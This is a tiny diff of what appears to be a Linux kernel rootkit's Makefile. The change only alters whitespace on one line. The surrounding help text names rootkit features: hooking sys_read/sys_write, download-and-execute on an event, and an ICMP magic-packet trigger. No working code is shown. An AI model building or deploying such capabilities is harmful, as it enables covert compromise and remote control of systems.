@@ -51,7 +51,7 @@ default:
 	@echo "HOOKRW       Hook sys_read and sys_write"
 	@echo "DLEXEC       Download & execute a binary upon event"
 	@echo "  ICMP       Monitor inbound ICMP for magic packet"
-
+	
 linux-x86:
 ifndef KDIR
 	@echo "Must provide KDIR!"
